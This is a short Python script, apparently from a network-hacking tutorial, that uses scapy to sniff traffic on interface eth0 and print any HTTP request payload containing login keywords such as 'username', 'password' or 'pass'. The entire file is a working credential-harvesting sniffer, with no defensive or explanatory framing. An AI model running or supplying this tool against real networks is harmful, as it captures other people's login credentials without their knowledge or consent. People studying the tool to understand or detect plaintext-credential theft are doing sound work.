#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_package)
    # Do not store packets in mem.


def process_sniffed_package(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['username', 'password', 'email', 'user', 'login', 'password', 'pass']
            for keyword in keywords:
                if keyword in load.lower():
                    print(load)
                    break


sniff('eth0')
